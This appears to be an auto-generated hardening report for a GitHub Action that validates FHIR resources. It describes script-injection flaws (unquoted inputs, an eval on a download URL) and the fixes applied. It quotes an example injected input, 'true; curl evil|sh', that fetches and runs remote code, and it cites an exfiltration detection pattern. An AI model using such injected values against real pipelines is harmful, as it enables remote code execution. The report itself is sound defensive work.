<!-- markdownlint-disable -->

# Hardening Report: FirelyTeam--firely-terminal-pipeline/v0.8.6

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **FirelyTeam--firely-terminal-pipeline/v0.8.6** was hardened automatically. 3 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Rule (b): many steps expand inputs (passed in through env:) without quotes. The common pattern `if $INPUT_X_ENABLED; then` runs the input's value as a shell command, so an input such as `true; curl evil|sh` executes. Affected steps and lines: 'Check if .NET is installed' (`if $INPUT_DOTNET_VALIDATION_ENABLED || $INPUT_TERMINOLOGY_SERVICE_BFARM_ENABLED; then`); 'Check .NET SDK Version'; 'Install Firely.Terminal' (also `dotnet tool install --global Firely.Terminal --version $FIRELY_TERMINAL_VERSION`); 'Check Firely Terminal Version'; 'Simplifier login' (`fhir login email=$INPUT_SIMPLIFIER_USERNAME password=$INPUT_SIMPLIFIER_PASSWORD`); 'Detect FHIR version...' (`if $INPUT_SUSHI_USE_CONFIG_DEPENDENCIES; then`, `elif $INPUT_SUSHI_ENABLED && ...`); 'Validate FHIR version support'; 'Set FHIR specification and restore dependencies'; 'Check if npm is installed'; 'Check npm Version'; 'Install fsh-sushi' (`sudo chown -R $USER ...`, `sudo npm install -g fsh-sushi@$SUSHI_VERSION`); 'Check SUSHI version'; 'Generate conformance resources with SUSHI' (`sushi $INPUT_SUSHI_OPTIONS`); 'Pre-processing FHIR profiles' (`if $CLOSE_SLICING_FOR_VALIDATION; then`); 'Configure Firely Terminal validator engine'; 'Run Quality Control checks' (`echo $INPUT_EXPECTED_FAILS`, `fhir check $INPUT_PATH_TO_QUALITY_CONTROL_RULES`); 'Report Success - .NET Validator'; 'Remove package cache...' (`if $INPUT_JAVA_SNAPSHOT_ENABLED`); 'Check if Java is installed'; 'Validate all conformance resources' (`for p in $INPUT_PATH_TO_CONFORMANCE_RESOURCES`, `$INPUT_JAVA_VALIDATION_OPTIONS`, `echo $INPUT_EXPECTED_FAILS`, `$FHIR_VERSION`); 'Validate all example resources' (`for p in $PATH_TO_EXAMPLES`, `$INPUT_JAVA_VALIDATION_OPTIONS`, `$FHIR_VERSION`); 'Re-run SUSHI...' (`if $CLOSE_SLICING_FOR_VALIDATION && $INPUT_SUSHI_ENABLED`, `sushi $INPUT_SUSHI_OPTIONS`). Fix: compare boolean inputs as strings (`[[ "$VAR" == "true" ]]`) and double-quote every expansion.

Locations:

- `action.yml:90`
- `action.yml:105`
- `action.yml:119`
- `action.yml:131`
- `action.yml:143`
- `action.yml:186`
- `action.yml:298`
- `action.yml:370`
- `action.yml:497`
- `action.yml:506`
- `action.yml:512`
- `action.yml:520`
- `action.yml:526`
- `action.yml:539`
- `action.yml:592`
- `action.yml:617`
- `action.yml:631`
- `action.yml:648`
- `action.yml:656`
- `action.yml:720`
- `action.yml:800`
- `action.yml:845`

### script-injection (severity: high)

Rule (b), step 'Download Java Validator': `JAVA_VALIDATOR_DOWNLOAD_LOCATION=$(eval echo "$JAVA_VALIDATOR_DOWNLOAD_LOCATION")` passes the input `inputs.JAVA_VALIDATOR_DOWNLOAD_LOCATION` to eval, which parses it again as shell code. Any `$(...)`, backticks or `;` in the input will run. The next line, `wget -q $JAVA_VALIDATOR_DOWNLOAD_LOCATION -O validator_cli.jar`, is also unquoted, and the step starts with an unquoted `if $INPUT_JAVA_VALIDATION_ENABLED; then`. Fix: remove eval and substitute only the version placeholder, for example `${JAVA_VALIDATOR_DOWNLOAD_LOCATION//\$JAVA_VALIDATOR_VERSION/$JAVA_VALIDATOR_VERSION}`, then quote the variable.

Locations:

- `action.yml:671`
- `action.yml:674`

### suspicious-run-content (severity: high)

outbound-exfiltration, step 'ZTS Package dependency restore': `curl -s -w "\n%{http_code}" -X POST https://terminologien.bfarm.de/api/generate-token -H "Content-Type: application/json" -d "$packagesForZtsToken"` matches the listed pattern `curl -X POST ... --data ...`. The body contains package names from package.json and goes to the documented BfArM terminology server, so this is probably legitimate. It is reported because it matches the pattern; please review it.

Locations:

- `action.yml:429`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, suspicious-run-content

**Notes:**

action.yml changes:
- Every `if $INPUT_X; then` boolean check (and its ||/&& variants) is now a string comparison: `[[ "$X" == "true" ]]`. An input value can no longer run as a command.
- Single values are now double-quoted: FIRELY_TERMINAL_VERSION, the fhir login email= and password= arguments, $USER, fsh-sushi@$SUSHI_VERSION, FHIR_VERSION, the cache path passed to rm -rf, the echo of FHIR_RESTORE, and the ZTS download URL. EXPECTED_FAILS now goes to grep through `printf '%s\n' "$VAR"`. PATH_TO_QUALITY_CONTROL_RULES is optional, so it uses `${VAR:+"$VAR"}` and drops out when empty.
- Download Java Validator: the eval is gone. Only the `$JAVA_VALIDATOR_VERSION` / `${JAVA_VALIDATOR_VERSION}` placeholder is replaced, using bash literal pattern substitution, and the resulting URL is quoted when passed to wget.
- Upstream left the list inputs unquoted so the shell would split them: SUSHI_OPTIONS, JAVA_VALIDATION_OPTIONS, PATH_TO_CONFORMANCE_RESOURCES and PATH_TO_EXAMPLES. They are now assigned unquoted to bash arrays and expanded as "${arr[@]}". That gives the same whitespace split and glob as upstream without evaluating anything. The internally built -ig parameter lists are also arrays now, and the workspace path prefix is quoted while the *.xml / *.json glob is kept.
- The detected FHIR_VERSION has CR/LF stripped before it is written to GITHUB_ENV.
- suspicious-run-content: I reviewed the ZTS token POST. It sends only package names from package.json devDependencies to the documented BfArM terminology server (terminologien.bfarm.de) and no secrets, so it is legitimate. I left the behaviour unchanged and added a comment explaining it.

